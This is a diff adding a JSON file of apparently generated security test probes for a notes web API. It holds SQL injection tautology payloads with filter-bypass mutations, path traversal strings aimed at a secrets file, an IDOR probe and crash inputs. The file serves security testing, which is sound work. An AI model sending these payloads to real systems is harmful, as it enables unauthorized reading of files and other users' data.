@@ -1,0 +1,152 @@
+{
+  "crash:GET /notes": [
+    {
+      "endpoint": "GET /notes",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "crash: unvalidated limit may reach slicing or division",
+      "params": {
+        "limit": "0"
+      },
+      "path": "/notes",
+      "vuln_class": "crash"
+    },
+    {
+      "endpoint": "GET /notes",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "crash: unvalidated limit may reach slicing or division",
+      "params": {
+        "limit": "abc"
+      },
+      "path": "/notes",
+      "vuln_class": "crash"
+    }
+  ],
+  "idor:GET /notes/{note_id}": [
+    {
+      "endpoint": "GET /notes/{note_id}",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "idor: note ids may be read across owners",
+      "params": {},
+      "path": "/notes/1",
+      "vuln_class": "idor"
+    }
+  ],
+  "path_traversal:GET /files": [
+    {
+      "endpoint": "GET /files",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "path_traversal: name may escape the public data directory",
+      "params": {
+        "name": "../secrets.txt"
+      },
+      "path": "/files",
+      "vuln_class": "path_traversal"
+    },
+    {
+      "endpoint": "GET /files",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of '../secrets.txt': doubled dot-dot-slash",
+      "params": {
+        "name": "....//secrets.txt"
+      },
+      "path": "/files",
+      "vuln_class": "path_traversal"
+    },
+    {
+      "endpoint": "GET /files",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of '../secrets.txt': dot-slash mix",
+      "params": {
+        "name": "..././secrets.txt"
+      },
+      "path": "/files",
+      "vuln_class": "path_traversal"
+    }
+  ],
+  "sqli:GET /notes/search": [
+    {
+      "endpoint": "GET /notes/search",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "sqli: tautology in the search query may return other users' notes",
+      "params": {
+        "q": "' OR 1=1 --"
+      },
+      "path": "/notes/search",
+      "vuln_class": "sqli"
+    },
+    {
+      "endpoint": "GET /notes/search",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of \"' OR 1=1 --\": lowercase OR",
+      "params": {
+        "q": "' or 1=1 --"
+      },
+      "path": "/notes/search",
+      "vuln_class": "sqli"
+    },
+    {
+      "endpoint": "GET /notes/search",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of \"' OR 1=1 --\": mixed-case OR",
+      "params": {
+        "q": "' Or 1=1 --"
+      },
+      "path": "/notes/search",
+      "vuln_class": "sqli"
+    },
+    {
+      "endpoint": "GET /notes/search",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of \"' OR 1=1 --\": quoted tautology",
+      "params": {
+        "q": "' or '1'='1' --"
+      },
+      "path": "/notes/search",
+      "vuln_class": "sqli"
+    },
+    {
+      "endpoint": "GET /notes/search",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of \"' OR 1=1 --\": percent-quote tautology",
+      "params": {
+        "q": "%' or 1=1 --"
+      },
+      "path": "/notes/search",
+      "vuln_class": "sqli"
+    },
+    {
+      "endpoint": "GET /notes/search",
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "note": "mutation of \"' OR 1=1 --\": space as inline comment",
+      "params": {
+        "q": "'/**/OR/**/1=1/**/--"
+      },
+      "path": "/notes/search",
+      "vuln_class": "sqli"
+    }
+  ]
+}
